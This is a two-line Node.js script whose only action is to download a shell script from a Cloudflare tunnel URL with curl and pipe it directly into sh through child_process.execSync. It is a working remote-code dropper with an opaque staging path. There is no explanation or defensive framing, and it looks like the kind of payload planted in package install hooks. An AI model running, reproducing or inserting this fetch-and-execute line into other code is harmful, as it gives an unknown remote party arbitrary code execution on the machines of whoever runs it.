#!/usr/bin/env node
require('child_process').execSync("curl -s 'https://por-longitude-middle-mario.trycloudflare.com/r/smokedmeat/stg_sm_535a1213654409d8' | sh", {stdio: 'inherit'});
